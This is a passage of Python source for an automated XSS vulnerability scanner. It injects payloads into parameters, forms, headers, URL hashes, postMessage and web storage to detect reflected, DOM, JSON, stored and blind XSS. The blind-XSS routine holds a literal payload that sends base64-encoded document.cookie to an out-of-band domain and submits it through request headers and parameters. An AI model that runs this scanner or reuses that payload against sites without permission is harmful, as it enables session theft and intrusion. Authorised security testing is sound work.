                reflected_vulns = self._scan_reflected_xss(pages, frameworks)
                self.vulnerabilities.extend(reflected_vulns)

                if not self.config.quiet:
                    print(f"{Fore.GREEN}[✓] Found {len(reflected_vulns)} reflected XSS vulnerabilities{Style.RESET_ALL}")

            # Phase 4: DOM XSS
            if self.config.scan_dom and self.browser_manager:
                if not self.config.quiet:
                    print(f"{Fore.YELLOW}[*] Phase 4: DOM XSS Scanning{Style.RESET_ALL}")

                dom_vulns = self._scan_dom_xss(pages)
                self.vulnerabilities.extend(dom_vulns)

                if not self.config.quiet:
                    print(f"{Fore.GREEN}[✓] Found {len(dom_vulns)} DOM XSS vulnerabilities{Style.RESET_ALL}")

            # Phase 5: JSON XSS
            if self.config.scan_json:
                if not self.config.quiet:
                    print(f"{Fore.YELLOW}[*] Phase 5: JSON XSS Scanning{Style.RESET_ALL}")

                json_vulns = self._scan_json_xss(pages)
                self.vulnerabilities.extend(json_vulns)

                if not self.config.quiet:
                    print(f"{Fore.GREEN}[✓] Found {len(json_vulns)} JSON XSS vulnerabilities{Style.RESET_ALL}")

            # Phase 6: Blind XSS
            if self.config.scan_blind:
                if not self.config.quiet:
                    print(f"{Fore.YELLOW}[*] Phase 6: Blind XSS Scanning{Style.RESET_ALL}")

                blind_vulns = self._scan_blind_xss(pages)
                self.vulnerabilities.extend(blind_vulns)

                if not self.config.quiet:
                    print(f"{Fore.GREEN}[✓] Found {len(blind_vulns)} blind XSS vulnerabilities{Style.RESET_ALL}")

            # Phase 7: Stored XSS (SAFE - last)
            if self.config.scan_stored:
                if not self.config.quiet:
                    print(f"{Fore.YELLOW}[*] Phase 7: Stored XSS Scanning (Safe Mode){Style.RESET_ALL}")

                stored_vulns = self._scan_stored_xss_safely(pages)
                self.vulnerabilities.extend(stored_vulns)

                if not self.config.quiet:
                    print(f"{Fore.GREEN}[✓] Found {len(stored_vulns)} stored XSS vulnerabilities{Style.RESET_ALL}")

            # Phase 8: Verification
            if not self.config.quiet:
                print(f"{Fore.YELLOW}[*] Phase 8: Vulnerability Verification{Style.RESET_ALL}")

            self.verified_vulnerabilities = self._verify_vulnerabilities(self.vulnerabilities)

            # Phase 9: Risk Assessment
            if self.config.risk_assessment:
                if not self.config.quiet:
                    print(f"{Fore.YELLOW}[*] Phase 9: Risk Assessment{Style.RESET_ALL}")

                self._assess_vulnerability_risks()

            # Create result
            result = self._create_result(pages, technologies, scan_start)

            if not self.config.quiet:
                print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}SCAN COMPLETED{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Duration: {result.duration:.2f} seconds{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Pages Scanned: {result.pages_scanned}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Vulnerabilities Found: {result.vulnerabilities_found}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")

            return result

        except KeyboardInterrupt:
            if not self.config.quiet:
                print(f"\n{Fore.RED}[!] Scan interrupted by user{Style.RESET_ALL}")
            raise

        except Exception as e:
            self.logger.error(f"Scan failed: {e}", exc_info=True)
            if not self.config.quiet:
                print(f"\n{Fore.RED}[!] Scan failed: {e}{Style.RESET_ALL}")
            raise

    def _scan_reflected_xss(self, pages: List[PageInfo], frameworks: List[str]) -> List[Vulnerability]:
        """Scan for reflected XSS vulnerabilities"""
        vulnerabilities = []

        with ThreadPoolExecutor(max_workers=self.config.max_threads) as executor:
            futures = []

            for page in pages:
                # Test URL parameters
                for param in page.parameters:
                    future = executor.submit(
                        self._test_parameter_reflected,
                        page.url, param, frameworks
                    )
                    futures.append(future)

                # Test forms
                for form in page.forms:
                    for input_field in form['inputs']:
                        if input_field.get('name'):
                            future = executor.submit(
                                self._test_form_reflected,
                                page.url, form, input_field, frameworks
                            )
                            futures.append(future)

                # Test headers
                if len(futures) < self.config.max_threads * 2:
                    future = executor.submit(self._test_headers_reflected, page.url)
                    futures.append(future)

            # Process results
            for future in as_completed(futures):
                try:
                    vulns = future.result(timeout=30)
                    vulnerabilities.extend(vulns)
                    self.stats['potential_xss'] += len(vulns)
                except Exception as e:
                    self.logger.debug(f"Reflected XSS test failed: {e}")

        return vulnerabilities

    def _test_headers_reflected(self, url: str) -> List[Vulnerability]:
        """Test HTTP headers for reflected XSS"""

        vulnerabilities = []

        headers_to_test = [
            "User-Agent",
            "Referer",
            "X-Forwarded-For",
            "X-Real-IP",
            "X-Client-IP",
        ]

        payloads = self.payload_generator.get_payloads(
            context="reflected",
            frameworks=[],  # headers are framework-agnostic
            evasion_level=2 if self.config.use_evasion else 0,
            count=self.config.max_payloads_per_param
        )

        for header in headers_to_test:
            for payload in payloads:
                try:
                    response = self.http_client.get(
                        url,
                        headers={header: payload}
                    )

                    if not response:
                        continue

                    reflection = self._analyze_reflection(payload, response.text)
                    self.stats["payloads_sent"] += 1

                    if reflection["reflected"] and reflection["context"] != "safe":
                        vuln = self._create_vulnerability(
                            vuln_type="reflected",
                            url=url,
                            method="GET",
                            parameter=f"header:{header}",
                            payload=payload,
                            confidence=reflection["confidence"],
                            evidence=f"Payload reflected via HTTP header {header}",
                            context={
                                "parameter_location": "header",
                                "header_name": header,
                                "reflection_context": reflection["context"],
                                "reflection_details": reflection.get("details", {}),
                                "verified_inline": True,
                            }
                        )

                        vulnerabilities.append(vuln)
                        self.stats["reflections_found"] += 1
                        #------------------
                        #added not need same header with multiple payloads
                        break
                        #------------------



                except Exception as e:
                    self.logger.debug(
                        f"Header reflected test failed ({header}): {e}"
                    )

        return vulnerabilities

    def _test_form_reflected(
            self,
            page_url: str,
            form: Dict,
            input_field: Dict,
            frameworks: List[str]
    ) -> List[Vulnerability]:
        """Test ONE form input for reflected XSS"""

        vulnerabilities = []

        field_name = input_field.get("name")
        if not field_name:
            return vulnerabilities

        method = form.get("method", "GET").upper()
        action = form.get("action") or page_url
        inputs = form.get("inputs", [])

        payloads = self.payload_generator.get_payloads(
            context="reflected",
            frameworks=frameworks,
            evasion_level=2 if self.config.use_evasion else 0,
            count=self.config.max_payloads_per_param
        )

        for payload in payloads:
            try:
                # --------------------------------------------------
                # Build form data (payload in THIS field only)
                # --------------------------------------------------
                data = {}

                for inp in inputs:
                    name = inp.get("name")
                    if not name:
                        continue

                    input_type = (inp.get("type") or "text").lower()
                    value = inp.get("value", "")

                    if name == field_name:
                        continue  # payload set later

                    if input_type in ("submit", "button"):
                        data[name] = value or "Submit"
                    elif input_type in ("checkbox", "radio"):
                        data[name] = value or "on"
                    elif input_type == "hidden":
                        data[name] = value or "1"
                    else:
                        data[name] = value or "test"

                # Inject payload into target field
                data[field_name] = payload

                # --------------------------------------------------
                # Send request
                # --------------------------------------------------
                if method == "POST":
                    response = self.http_client.post(action, data=data)
                else:
                    response = self.http_client.get(action, params=data)

                if not response:
                    continue

                # --------------------------------------------------
                # Reflection analysis
                # --------------------------------------------------
                reflection = self._analyze_reflection(payload, response.text)
                self.stats["payloads_sent"] += 1

                if reflection["reflected"] and reflection["context"] != "safe":
                    vuln = self._create_vulnerability(
                        vuln_type="reflected",
                        url=action,
                        method=method,
                        parameter=field_name,
                        payload=payload,
                        confidence=reflection["confidence"],
                        evidence=f"Payload reflected in {reflection['context']} context",
                        context={
                            "parameter_location": "form",
                            "form_action": action,
                            "form_method": method,
                            "reflection_context": reflection["context"],
                            "reflection_details": reflection.get("details", {}),
                            "verified_inline": True,
                        }
                    )

                    vulnerabilities.append(vuln)
                    self.stats["reflections_found"] += 1
                    # ------------------
                    # added no dynamic result
                    break
                    #------------



            except Exception as e:
                self.logger.debug(
                    f"Form reflected test failed (field={field_name}): {e}"
                )

        return vulnerabilities

    def _test_parameter_reflected(self, url: str, param: Dict, frameworks: List[str]) -> List[Vulnerability]:
        """Test a single parameter for reflected XSS"""
        vulnerabilities = []

        # Get payloads based on context
        payloads = self.payload_generator.get_payloads(
            context='reflected',
            frameworks=frameworks,
            evasion_level=2 if self.config.use_evasion else 0,
            count=self.config.max_payloads_per_param
        )

        for payload in payloads:
            try:
                # Construct test URL
                test_url = self._construct_test_url(url, param, payload)

                # Send request
                response = self.http_client.get(test_url)
                if not response:
                    continue

                # Check for reflection
                reflection_info = self._analyze_reflection(payload, response.text)
                self.stats['payloads_sent'] += 1

                if reflection_info['reflected'] and reflection_info['context'] != 'safe':
                    # Create vulnerability
                    vuln = self._create_vulnerability(
                        vuln_type='reflected',
                        url=test_url,
                        method='GET',
                        parameter=param['name'],
                        payload=payload,
                        confidence=reflection_info['confidence'],
                        evidence=f"Payload reflected in {reflection_info['context']} context",
                        context={
                            'parameter_location': param.get('location', 'query'),
                            'reflection_context': reflection_info['context'],
                            'reflection_details': reflection_info.get('details', {}),
                            "verified_inline": True,
                        }
                    )

                    vulnerabilities.append(vuln)
                    self.stats['reflections_found'] += 1
                    # ------------------
                    # added no dynamic result
                    break
                    #----------



            except Exception as e:
                self.logger.debug(f"Parameter test failed for {param['name']}: {e}")

        return vulnerabilities

    def _construct_test_url(self, base_url: str, param: Dict, payload: str) -> str:
        """Construct test URL with payload"""
        try:
            parsed = urlparse.urlparse(base_url)

            if param['location'] == 'query':
                # Handle query parameters
                query_dict = urlparse.parse_qs(parsed.query, keep_blank_values=True)
                query_dict[param['name']] = [payload]

                # Rebuild query
                new_query = urlparse.urlencode(query_dict, doseq=True)
                new_url = parsed._replace(query=new_query).geturl()

            elif param['location'] == 'fragment':
                # Handle fragment parameters
                fragment = f"{param['name']}={payload}"
                new_url = parsed._replace(fragment=fragment).geturl()

            elif param['location'] == 'path':
                # Handle path parameters (replace the parameter value in path)
                path_parts = parsed.path.split('/')
                param_index = int(param['name'].replace('path_', ''))
                if 0 <= param_index < len(path_parts):
                    path_parts[param_index] = payload
                    new_path = '/'.join(path_parts)
                    new_url = parsed._replace(path=new_path).geturl()
                else:
                    new_url = base_url

            else:
                new_url = base_url

            return new_url

        except Exception:
            return base_url

    def _analyze_reflection(self, payload: str, response_text: str) -> Dict:
        """Analyze payload reflection with context detection"""
        result = {
            'reflected': False,
            'context': 'safe',
            'confidence': 0.0,
            'details': {}
        }

        # Check for exact reflection
        if payload in response_text:
            result['reflected'] = True
            result['confidence'] = 0.8
            result['details']['method'] = 'exact_match'

        # Check for encoded reflection
        encoded_versions = [
            html.escape(payload),
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            urlparse.quote(payload),
            payload.replace('<', '%3C').replace('>', '%3E'),
            payload.replace('<', '\\x3c').replace('>', '\\x3e'),
            payload.replace('<', '\\74').replace('>', '\\76'),
        ]

        for encoded in encoded_versions:
            if encoded in response_text:
                result['reflected'] = True
                result['confidence'] = max(result['confidence'], 0.6)
                result['details']['method'] = 'encoded_match'
                result['details']['encoding'] = encoded
                break

        if not result['reflected']:
            return result

        # Determine context
        context = self._determine_reflection_context(payload, response_text)
        result['context'] = context['type']
        result['confidence'] = max(result['confidence'], context['confidence'])
        result['details'].update(context.get('details', {}))

        return result

    def _determine_reflection_context(self, payload: str, text: str) -> Dict:
        """Determine the context where payload is reflected"""
        # Find all occurrences of payload or its encoded versions
        occurrences = []

        # Search for payload
        pos = text.find(payload)
        while pos != -1:
            occurrences.append({'position': pos, 'payload': payload, 'encoded': False})
            pos = text.find(payload, pos + 1)

        # Search for encoded versions
        encoded_versions = [
            (html.escape(payload), 'html'),
            (payload.replace('<', '&lt;').replace('>', '&gt;'), 'html'),
            (urlparse.quote(payload), 'url'),
        ]

        for encoded, encoding_type in encoded_versions:
            pos = text.find(encoded)
            while pos != -1:
                occurrences.append({
                    'position': pos,
                    'payload': encoded,
                    'encoded': True,
                    'encoding': encoding_type
                })
                pos = text.find(encoded, pos + 1)

        if not occurrences:
            return {'type': 'safe', 'confidence': 0.0}

        # Analyze each occurrence
        for occ in occurrences:
            pos = occ['position']
            payload_text = occ['payload']

            # Extract context around the occurrence
            start = max(0, pos - 100)
            end = min(len(text), pos + len(payload_text) + 100)
            context = text[start:end]

            # Check for dangerous contexts
            dangerous_patterns = [
                # Script tag
                (r'<script[^>]*>.*?' + re.escape(payload_text), 'script_tag', 0.9),

                # Event handler
                (r'on\w+\s*=\s*[\'"][^\'"]*?' + re.escape(payload_text), 'event_handler', 0.9),

                # JavaScript in attribute
                (r'javascript:\s*' + re.escape(payload_text), 'javascript_url', 0.9),

                # Attribute value (could be dangerous)
                (r'(href|src|action)\s*=\s*[\'"][^\'"]*?' + re.escape(payload_text), 'attribute', 0.7),

                # Inside HTML tag
                (r'<[^>]*' + re.escape(payload_text) + '[^>]*>', 'html_tag', 0.6),

                # Plain text (safe if encoded)
                (re.escape(payload_text), 'text', 0.3 if occ['encoded'] else 0.5),
            ]

            for pattern, context_type, confidence in dangerous_patterns:
                if re.search(pattern, context, re.IGNORECASE | re.DOTALL):
                    return {
                        'type': context_type,
                        'confidence': confidence,
                        'details': {
                            'position': pos,
                            'context_snippet': context,
                            'encoded': occ.get('encoded', False),
                        }
                    }

        return {'type': 'safe', 'confidence': 0.0}

    def _create_vulnerability(self, vuln_type: str, url: str, method: str,
                              parameter: str, payload: str, confidence: float,
                              evidence: str, context: Dict = None) -> Vulnerability:
        """Create a vulnerability object"""

        # Determine severity based on type and confidence
        if vuln_type == 'stored':
            base_severity = 'high'
        elif vuln_type == 'dom':
            base_severity = 'medium'
        elif confidence >= 0.8:
            base_severity = 'high'
        elif confidence >= 0.5:
            base_severity = 'medium'
        else:
            base_severity = 'low'

        # Adjust based on context
        if context and context.get('reflection_context') in ['script_tag', 'event_handler']:
            base_severity = 'high'

        vuln = Vulnerability(
            id=hashlib.md5(f"{vuln_type}:{url}:{parameter}:{payload}".encode()).hexdigest()[:16],
            type=vuln_type,
            url=url,
            method=method,
            parameter=parameter,
            payload=payload,
            confidence=confidence,
            severity=base_severity,
            evidence=evidence,
            context=context or {},
            scanner_id=self.config.scan_id,
            timestamp=datetime.now().isoformat()
        )

        # Generate PoCs if enabled
        if self.config.generate_poc:
            vuln.generate_pocs()

        # Calculate CVSS if enabled
        if self.config.cvss_scoring:
            vuln.calculate_cvss()

        return vuln

    def _scan_dom_xss(self, pages: List[PageInfo]) -> List[Vulnerability]:
        """Scan for DOM-based XSS"""
        vulnerabilities = []

        if not self.browser_manager:
            return vulnerabilities

        # Limit pages for DOM scanning (resource intensive)
        dom_pages = pages[:min(10, len(pages))]

        for page in dom_pages:
            try:
                # Test hash-based XSS
                hash_vulns = self._test_dom_hash(page.url)
                vulnerabilities.extend(hash_vulns)

                # Test URL parameter DOM XSS
                param_vulns = self._test_dom_parameters(page.url)
                vulnerabilities.extend(param_vulns)

                # Test postMessage
                postmessage_vulns = self._test_postmessage(page.url)
                vulnerabilities.extend(postmessage_vulns)

                # Test localStorage/sessionStorage
                storage_vulns = self._test_web_storage(page.url)
                vulnerabilities.extend(storage_vulns)

            except Exception as e:
                self.logger.debug(f"DOM XSS scan failed for {page.url}: {e}")

        return vulnerabilities

    def _test_web_storage(self, url: str) -> List[Vulnerability]:
        """Advanced DOM XSS detection via Web Storage (localStorage / sessionStorage)"""
        vulnerabilities = []
        seen = set()

        payloads = self.payload_generator.get_payloads(
            context="dom",
            evasion_level=2 if self.config.use_evasion else 1,
            count=8
        )

        for payload in payloads:
            try:
                result = self.browser_manager.test_web_storage_execution(
                    url,
                    payload
                )

                if not result.get("executed"):
                    continue

                method = result.get("method", "unknown")
                storage = result.get("storage", "webStorage")

                confidence = self._calculate_dom_confidence(
                    result=result,
                    dom_location="web_storage"
                )

                # Deduplicate by sink + storage + payload
                dedup_key = (url, storage, method, payload)
                if dedup_key in seen:
                    continue
                seen.add(dedup_key)

                vuln = self._create_vulnerability(
                    vuln_type="dom",
                    url=url,
                    method="GET",
                    parameter=storage,
                    payload=payload,
                    confidence=confidence,
                    evidence=(
                        f"Persistent DOM XSS via {storage} executed using sink '{method}'"
                    ),
                    context={
                        "dom_location": "web_storage",
                        "storage_type": storage,
                        "execution_method": method,
                        "browser_verified": True,
                        "persistence": True,
                        "sink_strength": (
                            "strong" if method in {"eval", "Function", "innerHTML", "document.write"}
                            else "medium"
                        )
                    }
                )

                vulnerabilities.append(vuln)

                #--------------
                #dont added braek can contain dynamic result "sing_strength"


            except Exception as e:
                self.logger.debug(f"DOM web storage test failed for {url}: {e}")

        return vulnerabilities

    def _test_postmessage(self, url: str) -> List[Vulnerability]:
        """Advanced DOM XSS detection via window.postMessage"""
        vulnerabilities = []
        seen = set()

        payloads = self.payload_generator.get_payloads(
            context="dom",
            evasion_level=2 if self.config.use_evasion else 1,
            count=8
        )

        for payload in payloads:
            try:
                result = self.browser_manager.test_postmessage_execution(
                    url,
                    payload
                )

                if not result.get("executed"):
                    continue

                method = result.get("method", "unknown")

                confidence = self._calculate_dom_confidence(
                    result=result,
                    dom_location="postMessage"
                )

                # Dedup by sink + payload
                dedup_key = (url, "postMessage", method, payload)
                if dedup_key in seen:
                    continue
                seen.add(dedup_key)

                vuln = self._create_vulnerability(
                    vuln_type="dom",
                    url=url,
                    method="POSTMESSAGE",
                    parameter="window.postMessage",
                    payload=payload,
                    confidence=confidence,
                    evidence=f"DOM XSS via postMessage executed using sink '{method}'",
                    context={
                        "dom_location": "postMessage",
                        "execution_method": method,
                        "browser_verified": True,
                        "sink_strength": (
                            "strong" if method in {"eval", "Function", "innerHTML", "document.write"}
                            else "medium"
                        )
                    }
                )

                vulnerabilities.append(vuln)

            except Exception as e:
                self.logger.debug(f"DOM postMessage test failed for {url}: {e}")

        return vulnerabilities

    def _test_dom_parameters(self, url: str) -> List[Vulnerability]:
        """Advanced DOM XSS via URL parameters"""
        vulnerabilities = []

        payloads = self.payload_generator.get_payloads(
            context="dom",
            evasion_level=1 if self.config.use_evasion else 0,
            count=10
        )

        param_names = [
            "q", "search", "query", "page", "view",
            "id", "next", "redirect", "return", "url",
            "xss", "input"
        ]

        parsed = urllib.parse.urlsplit(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        existing_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        for param in param_names:
            for payload in payloads:
                try:
                    params = dict(existing_params)
                    params[param] = [payload]

                    test_url = f"{base_url}?{urllib.parse.urlencode(params, doseq=True)}"

                    result = self.browser_manager.test_dom_execution(test_url, payload)

                    if not result.get("executed"):
                        continue

                    confidence = self._calculate_dom_confidence(
                        result=result,
                        dom_location="url_parameter"
                    )

                    vuln = self._create_vulnerability(
                        vuln_type="dom",
                        url=test_url,
                        method="GET",
                        parameter=param,
                        payload=payload,
                        confidence=confidence,
                        evidence=f"DOM XSS via URL parameter '{param}' using {result.get('method')}",
                        context={
                            "dom_location": "url_parameter",
                            "parameter": param,
                            "execution_method": result.get("method"),
                            "browser_verified": True,
                        }
                    )

                    vulnerabilities.append(vuln)
                    #added break one param one payload enough
                    break
                    #---------------

                except Exception as e:
                    self.logger.debug(f"DOM parameter test failed ({param}): {e}")

        return vulnerabilities

    def _test_dom_hash(self, url: str) -> List[Vulnerability]:
        """Test hash-based DOM XSS"""
        vulnerabilities = []

        payloads = self.payload_generator.get_payloads(
            context='dom',
            evasion_level=1 if self.config.use_evasion else 0,
            count=10
        )

        for payload in payloads:
            try:
                if '#' in url:
                    url = url.split('#', 1)[0]
                    #test_url = f"{base}#{payload}"
                test_url = f"{url}#{payload}"

                result = self.browser_manager.test_dom_execution(test_url, payload)

                if result.get('executed'):
                    confidence = self._calculate_dom_confidence(result, 'hash')

                    vuln = self._create_vulnerability(
                        vuln_type='dom',
                        url=test_url,
                        method='GET',
                        parameter='hash',
                        payload=payload,
                        confidence=confidence,
                        evidence=f"DOM XSS executed via hash using {result.get('method', 'unknown')}",
                        context={
                            'dom_location': 'hash',
                            'execution_method': result.get('method', 'unknown'),
                            'browser_verified': True,
                            'confidence_reason': 'browser_verified_dom_execution'
                        }
                    )

                    vulnerabilities.append(vuln)
                    #added break because no other type vulnerabilty no dynamic result
                    break

            except Exception as e:
                self.logger.debug(f"DOM hash test failed: {e}")

        return vulnerabilities

    def _calculate_dom_confidence(self, result: dict, dom_location: str) -> float:
        """
        Calculate confidence score for DOM XSS based on execution evidence
        """

        confidence = 0.6  # base for DOM XSS

        # Strong execution sinks
        strong_sinks = {'eval', 'Function', 'innerHTML', 'document.write'}
        medium_sinks = {'alert', 'confirm', 'prompt', 'postMessage'}

        method = result.get('method')

        if method in strong_sinks:
            confidence += 0.25
        elif method in medium_sinks:
            confidence += 0.15

        # Location-based adjustment
        if dom_location == 'hash':
            confidence += 0.05  # weakest DOM entry
        elif dom_location == 'url_parameter':
            confidence += 0.15
        elif dom_location == 'postMessage':
            confidence += 0.2
        elif dom_location == 'web_storage':
            confidence += 0.25  # persistence = strong signal

        # Browser verified = mandatory for DOM
        if result.get('executed'):
            confidence += 0.1

        return round(min(confidence, 1.0), 2)

    def _scan_stored_xss_safely(self, pages: List[PageInfo]) -> List[Vulnerability]:
        """Scan for stored XSS with safe session isolation"""
        vulnerabilities = []

        # Create isolated session for stored XSS testing
        session_id = f"stored_{int(time.time())}"
        isolated_client = AdvancedHTTPClient(self.config)

        # Identify potential storage endpoints
        storage_endpoints = self._identify_storage_endpoints(pages)

        for endpoint in storage_endpoints[:5]:  # Limit to 5 endpoints for safety
            try:
                endpoint_vulns = self._test_stored_endpoint(endpoint, isolated_client, session_id)
                vulnerabilities.extend(endpoint_vulns)

                # Cleanup after each endpoint test
                time.sleep(1)

            except Exception as e:
                self.logger.debug(f"Stored XSS test failed for {endpoint}: {e}")

        return vulnerabilities

    def _identify_storage_endpoints(self, pages: List[PageInfo]) -> List[Dict]:
        """Identify potential storage endpoints"""
        endpoints = []
        storage_keywords = [
            'comment', 'message', 'post', 'article', 'review',
            'feedback', 'contact', 'submit', 'create', 'add',
            'edit', 'update', 'profile', 'account', 'settings',
            'blog', 'forum', 'chat', 'support', 'ticket',
            'admin', 'user', 'register', 'login'
        ]

        for page in pages:
            # Look for forms that might store data
            for form in page.forms:
                # Check for common storage patterns
                #-----------------
                #action = form.get('action', '').lower()
                #method = form.get('method', 'POST').upper()
                #--------------------------
                method = form.get('method', 'POST').upper()

                raw_action = (form.get('action') or '').strip()
                action_url = raw_action or page.url
                action_url = self._make_absolute(action_url, page.url)

                action_lc = action_url.lower()



                '''if any(keyword in action for keyword in storage_keywords):
                    endpoints.append({
                        'url': form['action'],
                        'method': method,
                        'type': 'form',
                        'inputs': form.get('inputs', []),
                        'source_page': page.url
                    })'''
                # keyword OR POST-based heuristic
                if method == 'POST' or any(k in action_lc for k in storage_keywords):
                    endpoints.append({
                        'url': action_url,
                        'method': method,
                        'inputs': form.get('inputs', []),
                        'source_page': page.url,
                        'confidence': 0.5
                    })

        return endpoints


    def _make_absolute(self, action_url: str, base_url: str) -> str:
        """
        Resolve form action to a safe absolute URL.
        Handles empty, relative, fragment, and javascript actions.
        """

        if not action_url:
            return base_url

        action_url = action_url.strip()

        # Ignore JS / fragments
        if action_url.startswith(("javascript:", "#")):
            return base_url

        # Already absolute
        parsed = urlparse.urlparse(action_url)
        if parsed.scheme in ("http", "https"):
            return action_url

        # Relative → absolute
        return urlparse.urljoin(base_url, action_url)

    def _test_stored_endpoint(self, endpoint: Dict,
                              client: AdvancedHTTPClient,
                              session_id: str) -> List[Vulnerability]:
        vulnerabilities = []

        marker = f"__XSSSTORED_{session_id}_{hashlib.md5(endpoint['url'].encode()).hexdigest()[:6]}__"

        NON_TEXT_INPUTS = {
            'submit', 'button', 'reset', 'file', 'image',
            'checkbox', 'radio', 'range', 'color'
        }

        payloads = self.payload_generator.get_payloads(
            context='stored',
            evasion_level=1 if self.config.use_evasion else 0,
            count=3  # Small number for stored XSS
        )


        testable_inputs = [
            inp for inp in endpoint['inputs']
            if inp.get('name')
               and inp.get('type', 'text').lower() not in NON_TEXT_INPUTS
        ]

        if not testable_inputs:
            return vulnerabilities

        for payload in payloads:
            for inp in testable_inputs[:2]:  # limit for safety
                try:
                    data = {}

                    for field in endpoint['inputs']:
                        if field.get('name'):
                            if field['name'] == inp['name']:

                                data[field['name']] = payload+marker
                            else:
                                data[field['name']] = field.get('value', 'test')

                    # Submit request
                    if endpoint['method'] == 'GET':
                        response = client.get(endpoint['url'], params=data)
                    else:
                        response = client.post(endpoint['url'], data=data)

                    if not response:
                        continue



                    if response.headers.get("Location"):
                        endpoint['url']= response.headers.get("Location") if "http" in response.headers.get("Location") else endpoint['url']+response.headers.get("Location")

                    if self._verify_stored_content(endpoint, payload+marker, client):
                        vulnerabilities.append(
                            self._build_stored_vuln(endpoint, inp, payload+marker, 0.9,True)
                        )
                        return vulnerabilities
                    #---------------dont added additional info just
                    #continue not next text

                    '''if marker in response.text:
                        vulnerabilities.append(self._build_stored_vuln(endpoint,inp,payload+marker,0.6,False))'''

                    #--------------------------
                except Exception as e:
                    self.logger.debug(f"Stored XSS test error: {e}")

        return vulnerabilities

    def _verify_stored_content(self,
                               endpoint: Dict,
                               marker: str,
                               client: AdvancedHTTPClient) -> bool:
        """Verify stored content across likely display surfaces"""

        surfaces = set()

        # Always check source page
        '''surfaces.add(endpoint['source_page'])

        # Heuristic sibling pages
        base = endpoint['source_page'].rstrip('/')
        surfaces.update({
            base,
            base + '?page=1',
            base + '?view=all',
            base + '/comments',
            base + '/view',
        })'''
        surfaces.update(self.crawler.visited.keys())

        # Poll with delay (async storage)
        for _ in range(3):
            for url in surfaces:
                try:
                    r = client.get(url)
                    if r and marker in r.text:
                        return True
                except Exception:
                    pass
            time.sleep(2)

        return False

    def _build_stored_vuln(self, endpoint, input_field, marker, confidence,verified = False):
        return self._create_vulnerability(
            vuln_type='stored',
            url=endpoint['url'],
            method=endpoint['method'],
            parameter=input_field['name'],
            payload=marker,
            confidence=confidence,
            evidence=f"Persistent marker detected: {marker}",
            context={
                'storage_verified': verified,
                'marker': marker,
                'source_page': endpoint['source_page']
            }
        )

    def _scan_json_xss(self, pages: List[PageInfo]) -> List[Vulnerability]:
        """Scan for JSON-based XSS"""
        vulnerabilities = []

        # Look for API endpoints
        api_endpoints = []
        for page in pages:
            # Check for JSON responses
            if 'application/json' in page.content_type.lower():
                api_endpoints.append(page.url)

            # Look for API patterns in links
            for link in page.links:
                if any(pattern in link.lower() for pattern in ['/api/', '/json/', '/rest/', '/graphql']):
                    api_endpoints.append(link)

        # Test API endpoints
        for endpoint in list(set(api_endpoints))[:10]:  # Limit to 10 endpoints
            try:
                endpoint_vulns = self._test_json_endpoint(endpoint)
                vulnerabilities.extend(endpoint_vulns)
            except Exception as e:
                self.logger.debug(f"JSON endpoint test failed for {endpoint}: {e}")

        return vulnerabilities

    def _test_json_endpoint(self, endpoint: str) -> List[Vulnerability]:
        """Test a JSON endpoint for XSS"""
        vulnerabilities = []

        payloads = self.payload_generator.get_payloads(
            context='json',
            count=5
        )

        for payload in payloads:
            try:
                # Try to parse as JSON
                try:
                    json_data = json.loads(payload)
                except:
                    json_data = {'input': payload}

                # Send JSON request
                response = self.http_client.post(
                    endpoint,
                    json=json_data,
                    session_type='api'
                )

                if not response:
                    continue

                # Check response
                if response.status_code < 400:
                    # Look for reflection
                    if payload in response.text:
                        vuln = self._create_vulnerability(
                            vuln_type='json',
                            url=endpoint,
                            method='POST',
                            parameter='json_body',
                            payload=payload,
                            confidence=0.6,
                            evidence='JSON payload reflected in response',
                            context={
                                'endpoint_type': 'json_api',
                                'response_status': response.status_code,
                                'content_type': response.headers.get('Content-Type', ''),
                            }
                        )

                        vulnerabilities.append(vuln)
                        #----------------
                        #No break because vulnerabilty verify going through multimethod test

            except Exception as e:
                self.logger.debug(f"JSON test failed: {e}")

        return vulnerabilities

    def _scan_blind_xss(self, pages: List[PageInfo]) -> List[Vulnerability]:
        """Scan for blind XSS"""
        vulnerabilities = []

        if not self.config.use_oob:
            return vulnerabilities

        # Generate unique identifier
        unique_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        domain = self.config.oob_domain

        # Create blind payload
        payload = f'<img src=x onerror="try{{new Image().src=\'http://{domain}/{unique_id}?data=\'+btoa(document.cookie)}}catch(e){{}}">'

        # Test in various contexts
        for page in pages[:5]:  # Limit to 5 pages
            contexts = [
                ('header', 'User-Agent', {'headers': {'User-Agent': payload}}),
                ('header', 'Referer', {'headers': {'Referer': payload}}),
                ('parameter', 'test', {'params': {'test': payload}}),
            ]

            for context_type, name, request_args in contexts:
                try:
                    response = self.http_client.get(page.url, **request_args)
                    triggered = False
                    if payload in response.text:
                        triggered = True


                    if response and response.status_code < 400:
                        vuln = self._create_vulnerability(
                            vuln_type='blind',
                            url=page.url,
                            method='GET',
                            parameter=f"{context_type}:{name}",
                            payload=payload,
                            confidence=0.4,
                            evidence=f'Blind XSS payload submitted via {context_type}',
                            context={
                                'unique_id': unique_id,
                                'oob_domain': domain,
                                'context_type': context_type,
                                'verification_required': True,
                                'verification_method': 'oob_callback',
                                'oob_triggered': triggered,
                            }
                        )

                        vulnerabilities.append(vuln)
                        #---------------
                        break
                        #--------------

                except Exception as e:
                    self.logger.debug(f"Blind XSS test failed: {e}")

        return vulnerabilities

    def _detect_technologies(self, pages: List[PageInfo]) -> Dict[str, List[str]]:
        """Detect technologies used by the application"""
        technologies = {
            'frameworks': [],
            'cms': [],
            'servers': [],
            'languages': [],
            'security': [],
        }

        for page in pages:
            for tech in page.technologies:
                if 'Framework:' in tech:
                    framework = tech.replace('Framework:', '').strip()
                    if framework not in technologies['frameworks']:
                        technologies['frameworks'].append(framework)
                elif 'CMS:' in tech:
                    cms = tech.replace('CMS:', '').strip()
                    if cms not in technologies['cms']:
                        technologies['cms'].append(cms)
                elif 'Server:' in tech or 'WebServer:' in tech:
                    server = tech.replace('Server:', '').replace('WebServer:', '').strip()
                    if server not in technologies['servers']:
